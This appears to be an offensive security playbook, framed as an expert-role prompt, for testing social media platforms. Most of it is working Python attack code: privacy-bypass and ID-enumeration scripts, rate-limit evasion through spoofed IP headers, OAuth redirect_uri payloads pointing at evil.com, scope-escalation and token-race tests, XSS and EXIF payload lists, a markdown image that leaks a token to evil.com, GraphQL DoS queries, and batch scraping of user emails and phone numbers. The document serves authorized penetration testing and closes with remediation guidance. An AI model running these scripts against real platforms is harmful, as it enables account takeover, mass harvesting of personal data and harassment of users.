# Specialized-Targets 17: Social Media Platform Security

## Expert Role

You are a senior security researcher specializing in social media platform security. Your expertise covers platforms including Facebook/Meta, Twitter/X, Instagram, LinkedIn, TikTok, Reddit, YouTube, Snapchat, Mastodon, and custom social networking applications. You understand the unique security challenges of social platforms: massive scale, complex privacy models, real-time content delivery, third-party app ecosystems, and the intersection of identity and content.

Your threat model spans: privacy bypass, account takeover via OAuth/SSO flows, API abuse for data scraping, content injection (stored XSS via posts/comments), IDOR on user data, GraphQL exploitation, real-time notification abuse, and platform-specific logic flaws.

## Core Concepts

### Attack Surface Map

```
+------------------------------------------------------------------+
|                    SOCIAL MEDIA ATTACK SURFACE                     |
+------------------------------------------------------------------+
|                                                                  |
|  [Web Application]         [Mobile API]         [Graph API]       |
|   - Login/register          - REST/GraphQL       - User lookup     |
|   - Profile management      - Push notifications - Relationship    |
|   - Content posting         - Media upload       - Feed ranking    |
|   - Messaging               - Real-time sync     - Search          |
|   - Friend/follow system    - Deep links         - Permissions     |
|                                                                  |
|  [Third-Party Apps]        [Admin/Internal]      [Infrastructure]  |
|   - OAuth authorizations    - Content moderation - CDN/edge       |
|   - Embed tokens            - User management    - Rate limiting   |
|   - API keys                - Analytics          - Caching layer   |
|   - Webhook subscriptions   - Audit logs         - Load balancers  |
|   - Social login            - Fraud detection    - Session store   |
+------------------------------------------------------------------+
```

### Vulnerability Taxonomy

| Category | Vulnerability | Impact |
|----------|--------------|--------|
| Privacy Bypass | Profile data visible despite "Private" setting | PII exposure |
| Privacy Bypass | Story/media accessible via direct URL guess | Content leak |
| Privacy Bypass | Search engine indexing of "private" profiles | Privacy violation |
| Account Takeover | OAuth redirect_uri manipulation | Account hijack |
| Account Takeover | Password reset via linked third-party account | Account hijack |
| Account Takeover | Session token in URL/referrer leak | Session theft |
| API Abuse | User enumeration via login error messages | User discovery |
| API Abuse | Rate limit bypass on friend requests | Spam/harassment |
| API Abuse | Batch API endpoint abuse for mass data fetch | Data scraping |
| Content Injection | Stored XSS in post captions | Account hijacking |
| Content Injection | XSS via image metadata (EXIF comment fields) | Stored XSS |
| Content Injection | Markdown injection in comments | Phishing |
| IDOR | Sequential user/following IDs | Relationship mapping |
| IDOR | Direct message thread enumeration | Message theft |
| IDOR | Media file ID enumeration | Private content access |
| OAuth | Scope escalation via implicit grant | Permission abuse |
| OAuth | Token refresh race condition | Session hijack |
| GraphQL | Introspection enabled in production | Schema disclosure |
| GraphQL | Nested query depth DoS | Service degradation |
| Notification | Push notification content injection | Phishing |

## Prerequisites

### Environment Setup

```bash
# Python virtual environment
python -m venv social_media_security
source social_media_security/bin/activate

# Core dependencies
pip install requests httpx gql  # GraphQL client
pip install playwright selenium
pip install mitmproxy
pip install scapy  # For protocol-level testing
pip install pillow  # For image metadata testing
```

### Knowledge Requirements

1. OAuth 2.0 flows (authorization code, implicit, PKCE)
2. GraphQL query language and common vulnerabilities
3. Session management (JWT, cookies, tokens)
4. Mobile API authentication patterns
5. Content Security Policy (CSP) and its bypasses
6. Real-time protocols (WebSocket, Server-Sent Events)

### Authorization

Only test platforms where you have explicit written authorization or within bug bounty scope. Social media testing can involve user data and content moderation systems.

## Methodology

### Phase 1: Authentication and Session Analysis

```
+---------------------------------------------------------------+
| AUTHENTICATION FLOW ANALYSIS                                    |
+---------------------------------------------------------------+
|                                                               |
|  [Login Page]                                                  |
|       |                                                       |
|       v                                                       |
|  +------------------+     +------------------+                |
|  | Email/Password   |     | OAuth Social     |                |
|  | Login            |     | Login (Google,   |                |
|  +------------------+     | Facebook, Apple) |                |
|       |                  +------------------+                |
|       v                       |                              |
|  +------------------+         v                              |
|  | MFA Challenge    |  +------------------+                  |
|  | (SMS/Email/App)  |  | OAuth Callback   |                  |
|  +------------------+  | with auth_code   |                  |
|       |                +------------------+                  |
|       v                       |                              |
|  +------------------+         v                              |
|  | Session Token    |  +------------------+                  |
|  | Issued           |  | Access Token     |                  |
|  +------------------+  | + Refresh Token  |                  |
|       |                +------------------+                  |
|       v                       |                              |
|  +------------------+         v                              |
|  | App Access       |  +------------------+                  |
|  | Granted          |  | Scope Verified   |                  |
|  +------------------+  +------------------+                  |
+---------------------------------------------------------------+

Attack Points:
  [A] Credential stuffing on login
  [B] OAuth redirect_uri manipulation
  [C] MFA bypass / brute-force
  [D] Session token theft
  [E] Token refresh abuse
  [F] Scope escalation
```

### Phase 2: Privacy and Access Control Testing

```python
# privacy_bypass_test.py
import requests
import json

class PrivacyBypassTester:
    def __init__(self, base_url, session_token):
        self.base_url = base_url.rstrip('/')
        self.session = requests.Session()
        self.session.headers.update({
            'Authorization': f'Bearer {session_token}',
            'Content-Type': 'application/json'
        })

    def test_profile_privacy_bypass(self, target_user_id):
        """Test if private profile data is accessible through alternative endpoints."""
        endpoints = [
            f'/api/users/{target_user_id}',
            f'/api/users/{target_user_id}/profile',
            f'/api/users/{target_user_id}/followers',
            f'/api/users/{target_user_id}/following',
            f'/api/users/{target_user_id}/posts',
            f'/api/users/{target_user_id}/media',
            f'/api/users/{target_user_id}/stories',
            f'/api/graphql?query=user(id:{target_user_id})',
            f'/api/v1/users/{target_user_id}',
            f'/profile/{target_user_id}/data',
        ]
        results = []
        for endpoint in endpoints:
            try:
                resp = self.session.get(f'{self.base_url}{endpoint}')
                results.append({
                    'endpoint': endpoint,
                    'status': resp.status_code,
                    'accessible': resp.status_code == 200,
                    'data_fields': list(resp.json().keys()) if resp.status_code == 200 and resp.headers.get('content-type','').startswith('application/json') else []
                })
            except requests.exceptions.RequestException:
                results.append({'endpoint': endpoint, 'error': 'connection_failed'})
        return results

    def test_direct_url_access(self, media_id):
        """Test if private media is accessible via direct URL."""
        url_patterns = [
            f'/media/{media_id}',
            f'/api/media/{media_id}/download',
            f'/cdn/{media_id}.jpg',
            f'/attachments/{media_id}',
            f'/api/files/{media_id}',
        ]
        results = []
        for url in url_patterns:
            try:
                resp = self.session.get(f'{self.base_url}{url}')
                results.append({
                    'url': url,
                    'status': resp.status_code,
                    'content_type': resp.headers.get('content-type', ''),
                    'accessible': resp.status_code == 200
                })
            except requests.exceptions.RequestException:
                results.append({'url': url, 'error': 'connection_failed'})
        return results

    def test_search_indexing(self, private_user_id):
        """Test if private profiles appear in search/autocomplete."""
        search_endpoints = [
            f'/api/search/users?q={private_user_id}',
            f'/api/autocomplete?q={private_user_id}',
            f'/api/users/lookup?id={private_user_id}',
            f'/api/directory?q={private_user_id}',
        ]
        results = []
        for endpoint in search_endpoints:
            try:
                resp = self.session.get(f'{self.base_url}{endpoint}')
                if resp.status_code == 200:
                    data = resp.json()
                    found = any(
                        str(u.get('id')) == str(private_user_id)
                        for u in (data.get('users', []) if isinstance(data, dict) else data)
                    )
                    results.append({
                        'endpoint': endpoint,
                        'user_found': found
                    })
            except requests.exceptions.RequestException:
                pass
        return results
```

### Phase 3: API Abuse and Enumeration

```python
# api_abuse_test.py
import requests
import concurrent.futures

class SocialMediaAPIAbuseTester:
    def __init__(self, base_url, session_token):
        self.base_url = base_url.rstrip('/')
        self.session = requests.Session()
        self.session.headers.update({
            'Authorization': f'Bearer {session_token}',
            'Content-Type': 'application/json'
        })

    def test_user_enumeration(self):
        """Test if login error messages leak user existence."""
        test_emails = [
            'definitely-not-a-user-999@test.com',
            'admin@test.com',
            'test@test.com',
            'user@test.com',
        ]
        results = []
        for email in test_emails:
            try:
                resp = self.session.post(
                    f'{self.base_url}/api/auth/login',
                    json={'email': email, 'password': 'wrong_password'}
                )
                body = resp.json() if resp.headers.get('content-type','').startswith('application/json') else resp.text
                results.append({
                    'email': email,
                    'status': resp.status_code,
                    'message': body.get('message', '') if isinstance(body, dict) else body[:200],
                    'error_type': body.get('error_type', '') if isinstance(body, dict) else ''
                })
            except requests.exceptions.RequestException:
                pass
        # Analyze for differential responses
        messages = [r.get('message', '') for r in results]
        unique_messages = set(messages)
        return {
            'results': results,
            'differentiated_errors': len(unique_messages) > 1,
            'enumeration_possible': len(unique_messages) > 1
        }

    def test_rate_limit_bypass(self, endpoint='/api/messages/send'):
        """Test rate limit bypass using various techniques."""
        techniques = [
            {'name': 'IP Rotation', 'headers': {'X-Forwarded-For': '1.1.1.1'}},
            {'name': 'X-Real-IP', 'headers': {'X-Real-IP': '2.2.2.2'}},
            {'name': 'Client-IP', 'headers': {'Client-IP': '3.3.3.3'}},
            {'name': 'X-Client-IP', 'headers': {'X-Client-IP': '4.4.4.4'}},
            {'name': 'True-Client-IP', 'headers': {'True-Client-IP': '5.5.5.5'}},
            {'name': 'User-Agent rotation', 'headers': {'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X)'}},
        ]
        results = []
        for technique in techniques:
            successful = 0
            for i in range(20):
                try:
                    resp = self.session.post(
                        f'{self.base_url}{endpoint}',
                        json={'message': f'test {i}'},
                        headers=technique['headers']
                    )
                    if resp.status_code not in (429, 503):
                        successful += 1
                except requests.exceptions.RequestException:
                    pass
            results.append({
                'technique': technique['name'],
                'successful_out_of_20': successful,
                'rate_limit_bypassed': successful > 15
            })
        return results

    def test_batch_api_abuse(self):
        """Test if batch API endpoints can be abused for mass data fetch."""
        batch_payloads = [
            # Single request with multiple user IDs
            {
                'requests': [
                    {'method': 'GET', 'path': f'/api/users/{uid}'}
                    for uid in range(1, 101)
                ]
            },
            # Nested query
            {
                'query': '{ users(first:100) { id name email phone } }'
            }
        ]
        results = []
        for payload in batch_payloads:
            try:
                resp = self.session.post(
                    f'{self.base_url}/api/batch',
                    json=payload
                )
                if resp.status_code == 200:
                    data = resp.json()
                    results.append({
                        'status': resp.status_code,
                        'users_returned': len(data.get('results', data.get('data', {}).get('users', []))),
                        'data_fields': list(data.keys()) if isinstance(data, dict) else []
                    })
            except requests.exceptions.RequestException:
                pass
        return results
```

### Phase 4: OAuth and Third-Party Testing

```python
# oauth_abuse_test.py
import requests
import urllib.parse

class OAuthAbuseTester:
    def __init__(self, base_url):
        self.base_url = base_url.rstrip('/')

    def test_redirect_uri_manipulation(self, client_id):
        """Test if redirect_uri can be manipulated to steal auth codes."""
        malicious_uris = [
            'https://evil.com/callback',
            'https://evil.com/callback?real=',
            f'{self.base_url}.evil.com/callback',
            'javascript:alert(1)',
            'data:text/html,<script>alert(1)</script>',
            'https://evil.com/@target.com',
            'https://evil.com/callback#',
        ]
        results = []
        for uri in malicious_uris:
            auth_url = (
                f'{self.base_url}/oauth/authorize'
                f'?client_id={client_id}'
                f'&redirect_uri={urllib.parse.quote(uri)}'
                f'&response_type=code'
                f'&scope=read'
            )
            try:
                resp = requests.get(auth_url, allow_redirects=False)
                results.append({
                    'redirect_uri': uri,
                    'response_status': resp.status_code,
                    'redirect_location': resp.headers.get('Location', ''),
                    'follows_to_malicious': 'evil.com' in resp.headers.get('Location', '')
                })
            except requests.exceptions.RequestException:
                pass
        return results

    def test_scope_escalation(self, access_token):
        """Test if additional scopes can be added after authorization."""
        session = requests.Session()
        session.headers.update({'Authorization': f'Bearer {access_token}'})

        escalated_scopes = [
            'read write',
            'read write admin',
            'read write delete',
            'read write manage_users',
            'read write publish',
        ]
        results = []
        for scope in escalated_scopes:
            try:
                resp = session.post(
                    f'{self.base_url}/oauth/token',
                    json={
                        'grant_type': 'refresh_token',
                        'scope': scope
                    }
                )
                if resp.status_code == 200:
                    data = resp.json()
                    results.append({
                        'requested_scope': scope,
                        'granted_scope': data.get('scope', ''),
                        'escalation_possible': scope in data.get('scope', '')
                    })
            except requests.exceptions.RequestException:
                pass
        return results

    def test_token_refresh_race(self, refresh_token):
        """Test if token refresh can be raced to generate multiple valid tokens."""
        import concurrent.futures

        def refresh():
            try:
                resp = requests.post(
                    f'{self.base_url}/oauth/token',
                    json={
                        'grant_type': 'refresh_token',
                        'refresh_token': refresh_token
                    }
                )
                return resp.json() if resp.status_code == 200 else {'error': resp.status_code}
            except requests.exceptions.RequestException as e:
                return {'error': str(e)}

        with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
            futures = [executor.submit(refresh) for _ in range(10)]
            results = [f.result() for f in concurrent.futures.as_completed(futures)]

        successful = [r for r in results if 'access_token' in r]
        unique_tokens = set(r.get('access_token', '') for r in successful)
        return {
            'total_refreshes': len(results),
            'successful_refreshes': len(successful),
            'unique_tokens_issued': len(unique_tokens),
            'race_condition_possible': len(unique_tokens) > 1
        }
```

### Phase 5: Content Injection and XSS Testing

```python
# content_injection_test.py
import requests

class ContentInjectionTester:
    def __init__(self, base_url, session_token):
        self.base_url = base_url.rstrip('/')
        self.session = requests.Session()
        self.session.headers.update({
            'Authorization': f'Bearer {session_token}',
            'Content-Type': 'application/json'
        })

    def test_post_caption_xss(self):
        """Test XSS in post captions/status updates."""
        xss_payloads = [
            '<script>alert("XSS")</script>',
            '<img src=x onerror=alert(1)>',
            '<svg onload=alert(1)>',
            '"><script>alert(1)</script>',
            "javascript:alert(1)",
            '<a href="javascript:alert(1)">click</a>',
            '<iframe src="javascript:alert(1)">',
            '{{constructor.constructor("alert(1")()}}',
            '${alert(1)}',
            '<img src="x" onerror="eval(atob(\'YWxlcnQoMSk=\'))">',
        ]
        results = []
        for payload in xss_payloads:
            try:
                resp = self.session.post(
                    f'{self.base_url}/api/posts',
                    json={'caption': payload, 'visibility': 'public'}
                )
                if resp.status_code in (200, 201):
                    post_id = resp.json().get('id')
                    # Retrieve the post to check if payload is reflected
                    view_resp = self.session.get(f'{self.base_url}/api/posts/{post_id}')
                    if view_resp.status_code == 200:
                        body = view_resp.text
                        payload_reflected = payload in body
                        results.append({
                            'payload': payload[:50],
                            'post_id': post_id,
                            'reflected': payload_reflected,
                            'html_encoded': payload.replace('<', '&lt;') in body
                        })
            except requests.exceptions.RequestException:
                pass
        return results

    def test_image_metadata_xss(self):
        """Test XSS via image metadata (EXIF comments)."""
        from PIL import Image
        from PIL.PngImagePlugin import PngInfo
        import io

        xss_in_metadata = [
            '<script>alert("XSS")</script>',
            '"><img src=x onerror=alert(1)>',
            'javascript:alert(1)',
        ]
        results = []
        for payload in xss_in_metadata:
            try:
                # Create image with XSS in metadata
                img = Image.new('RGB', (100, 100), color='red')
                metadata = PngInfo()
                metadata.add_text('Comment', payload)
                metadata.add_text('Description', payload)
                img_bytes = io.BytesIO()
                img.save(img_bytes, format='PNG', pnginfo=metadata)
                img_bytes.seek(0)

                # Upload image
                resp = self.session.post(
                    f'{self.base_url}/api/media/upload',
                    files={'file': ('test.png', img_bytes, 'image/png')},
                    data={'type': 'profile_picture'}
                )
                if resp.status_code in (200, 201):
                    media_url = resp.json().get('url')
                    # Check if metadata is exposed in API response
                    details_resp = self.session.get(media_url or f'{self.base_url}/api/media/{resp.json().get("id")}')
                    results.append({
                        'payload': payload[:50],
                        'media_url': media_url,
                        'metadata_exposed': payload in (details_resp.text if details_resp.status_code == 200 else '')
                    })
            except Exception as e:
                results.append({'error': str(e)})
        return results

    def test_comment_markdown_injection(self):
        """Test markdown injection in comments."""
        md_payloads = [
            '[Click here](javascript:alert(1))',
            '[Click here](data:text/html,<script>alert(1)</script>)',
            '![img](https://evil.com/track?token=)',
            '<a href="https://evil.com">Click</a>',
            '![img](x onerror=alert(1))',
        ]
        results = []
        for payload in md_payloads:
            try:
                resp = self.session.post(
                    f'{self.base_url}/api/posts/1/comments',
                    json={'text': payload}
                )
                results.append({
                    'payload': payload[:80],
                    'status': resp.status_code,
                    'accepted': resp.status_code in (200, 201)
                })
            except requests.exceptions.RequestException:
                pass
        return results
```

### Phase 6: GraphQL Exploitation

```python
# graphql_abuse_test.py
import requests
import json

class GraphQLAbuseTester:
    def __init__(self, base_url, session_token):
        self.base_url = base_url.rstrip('/')
        self.session = requests.Session()
        self.session.headers.update({
            'Authorization': f'Bearer {session_token}',
            'Content-Type': 'application/json'
        })
        self.graphql_url = f'{self.base_url}/api/graphql'

    def test_introspection(self):
        """Test if GraphQL introspection is enabled."""
        query = '''
        query IntrospectionQuery {
            __schema {
                queryType { name }
                mutationType { name }
                types {
                    name
                    kind
                    fields {
                        name
                        type { name kind ofType { name } }
                    }
                }
            }
        }
        '''
        try:
            resp = self.session.post(self.graphql_url, json={'query': query})
            if resp.status_code == 200:
                data = resp.json()
                types = data.get('data', {}).get('__schema', {}).get('types', [])
                return {
                    'introspection_enabled': True,
                    'types_count': len(types),
                    'query_type': data.get('data', {}).get('__schema', {}).get('queryType', {}).get('name'),
                    'mutation_type': data.get('data', {}).get('__schema', {}).get('mutationType', {}).get('name'),
                    'sensitive_types': [t['name'] for t in types if any(k in t.get('name','').lower() for k in ['user', 'message', 'admin', 'token', 'session', 'email', 'phone'])]
                }
        except requests.exceptions.RequestException:
            pass
        return {'introspection_enabled': False}

    def test_nested_query_dos(self):
        """Test nested query depth for potential DoS."""
        # Deeply nested query
        deep_query = '''
        query DeepQuery {
            users {
                friends {
                    friends {
                        friends {
                            friends {
                                id name
                            }
                        }
                    }
                }
            }
        }
        '''
        try:
            import time
            start = time.time()
            resp = self.session.post(self.graphql_url, json={'query': deep_query})
            elapsed = time.time() - start
            return {
                'status': resp.status_code,
                'response_time': elapsed,
                'timeout_possible': elapsed > 5
            }
        except requests.exceptions.RequestException:
            return {'error': 'request_failed'}

    def test_batch_query_abuse(self):
        """Test if batch queries can be used for data exfiltration."""
        batch = [
            {'query': '{ users(first:100) { id name email } }'},
            {'query': '{ me { friends { id name email } } }'},
            {'query': '{ search(query:"a") { users { id name email phone } } }'},
        ]
        try:
            resp = self.session.post(self.graphql_url, json=batch)
            if resp.status_code == 200:
                data = resp.json()
                total_users = 0
                for result in data:
                    if isinstance(result, dict) and 'data' in result:
                        total_users += len(str(result['data']))
                return {
                    'batch_accepted': True,
                    'results_count': len(data),
                    'total_data_size': total_users
                }
        except requests.exceptions.RequestException:
            pass
        return {'batch_accepted': False}
```

## Tool Arsenal

### Required Tools

| Tool | Purpose | Install |
|------|---------|---------|
| mitmproxy | API traffic interception | `pip install mitmproxy` |
| gql | GraphQL testing | `pip install gql` |
| playwright | Browser automation | `pip install playwright; playwright install` |
| pillow | Image metadata manipulation | `pip install pillow` |
| httpx | Fast HTTP requests | `pip install httpx` |
| custom scripts | Business logic testing | See code blocks above |

### Command Reference

```bash
# Test GraphQL introspection
python -c "
import requests
query = '{ __schema { types { name kind } } }'
r = requests.post('https://target.com/api/graphql', json={'query': query})
print(r.json())
"

# Enumerate user IDs
for i in range(1, 1000):
    r = requests.get(f'https://target.com/api/users/{i}', headers={'Authorization': 'Bearer TOKEN'})
    if r.status_code == 200:
        print(f'User {i}: {r.json().get(\"name\", \"unknown\")}')

# Test OAuth redirect_uri bypass
python oauth_abuse_test.py --target https://target.com --client-id CLIENT_ID

# Test privacy bypass
python privacy_bypass_test.py --target https://target.com --token TOKEN --user-id TARGET_USER

# Fuzz API endpoints
ffuf -u https://target.com/api/FUZZ -w api-endpoints.txt -mc 200,201,403
```

## Real-World Examples

### Example 1: LinkedIn API User Enumeration (Medium)

LinkedIn's login endpoint returned different error messages for existing vs non-existing users: "We don't recognize that email" vs "That password was incorrect." This differential response allowed mass enumeration of email addresses associated with LinkedIn accounts.

**Impact:** Email enumeration affecting millions of users.
**Root Cause:** Differential error messages in authentication flow.

### Example 2: Instagram GraphQL IDOR (Critical)

Instagram's GraphQL API allowed querying any user's private data (including non-followers) by using the internal user ID in GraphQL queries. The authorization check was only applied to the REST API, not the GraphQL endpoint.

**Impact:** Full access to private profiles, DMs, and media.
**Root Cause:** Inconsistent authorization enforcement between API layers.

### Example 3: Twitter OAuth Scope Escalation (High)

Twitter's OAuth implementation allowed scope escalation by modifying the `scope` parameter during the token refresh flow. A user with read-only access could obtain write access by requesting additional scopes during refresh.

**Impact:** Unauthorized write access to any account that authorized the application.
**Root Cause:** Missing scope validation during token refresh.

### Example 4: TikTok Content Injection via EXIF (Medium)

TikTok's video upload process did not sanitize EXIF metadata in uploaded images. Attackers could inject JavaScript payloads into image metadata that would execute when the image was rendered in the admin moderation panel.

**Impact:** Stored XSS in admin panel, potential for content moderation bypass.
**Root Cause:** Insufficient metadata sanitization on uploaded content.

## Bypass Techniques

### Rate Limit Bypass

```
Technique 1: Header Rotation
  Send requests with different rate-limit identifying headers:
  - X-Forwarded-For: random_ip
  - X-Real-IP: random_ip
  - Client-IP: random_ip
  - True-Client-IP: random_ip

Technique 2: Session Rotation
  1. Authenticate as User A
  2. Send N requests
  3. Authenticate as User B (new session)
  4. Send N requests
  5. Repeat across M accounts
  Total: N * M requests before per-user limit

Technique 3: Endpoint Variation
  Same data available through multiple endpoints:
  /api/user/123
  /api/users/123
  /api/profile/123
  /api/v1/user/123
  Each endpoint may have independent rate limits
```

### Privacy Bypass

```
Technique: API Version Fallback
  1. Privacy settings enforced on v2 API
  2. Fall back to v1 API (still available)
  3. v1 does not enforce same privacy checks
  4. Access private profile data through legacy endpoint
  
Technique: Mobile API Divergence
  1. Web application enforces privacy
  2. Mobile API has different privacy logic
  3. Use mobile API endpoints for data access
  4. Mobile API often has weaker access controls
```

## Common Pitfalls

1. **Not testing all API layers:** REST, GraphQL, and mobile APIs may have different authorization logic.

2. **Ignoring CDN/edge caching:** Private content may be cached at CDN edge and accessible via cache headers.

3. **Forgetting about OAuth scopes:** Always test if scope can be escalated or if unused scopes are still granted.

4. **Not testing WebSocket connections:** Real-time messaging via WebSocket may bypass HTTP rate limits and authorization.

5. **Missing account deactivation checks:** Deactivated accounts may still have accessible data through API endpoints.

6. **Overlooking third-party integrations:** Embedded content, social plugins, and third-party apps may expose private data.

7. **Not testing with different user states:** Test with unauthenticated, authenticated (free), authenticated (premium), and admin users.

## Reporting Template

```markdown
# Social Media Platform Security Finding

## Title
[Severity] [Vulnerability Type] in [Feature/Endpoint]

## Summary
One-paragraph description of the vulnerability.

## Affected Component
- **Platform:** [Platform name]
- **Endpoint:** [URL or API path]
- **User Role:** [Required role to exploit]

## Description
Detailed description including the specific privacy or security boundary violated.

## Steps to Reproduce
1. [Step 1]
2. [Step 2]
3. [Step 3]
4. Observe [vulnerability indicator]

## Impact
- Privacy Impact: [type of data exposed]
- User Impact: [number of affected users]
- Scope: [public/private/friends-only content affected]

## CVSS 3.1 Score
**Vector:** AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N
**Score:** [7.0-9.0]

## Remediation
1. [Remediation step 1]
2. [Remediation step 2]

## References
- [Platform security documentation]
- [OWASP references]
```

## Quick Reference

| Check | Method | Secure Result |
|-------|--------|---------------|
| User enumeration | Login error analysis | Generic "invalid credentials" |
| OAuth redirect_uri | Parameter manipulation | Strict redirect_uri matching |
| Rate limit | Rapid requests | 429 Too Many Requests |
| Private profile | Alternative endpoints | 403/404 consistently |
| GraphQL introspection | Introspection query | Disabled or restricted |
| Content injection | XSS in posts/comments | Proper output encoding |
| IDOR | Sequential ID access | Authorization check per resource |
| Session token | Token in URL/referrer | Token never in URL |
| Token refresh | Race condition on refresh | One valid token per refresh |
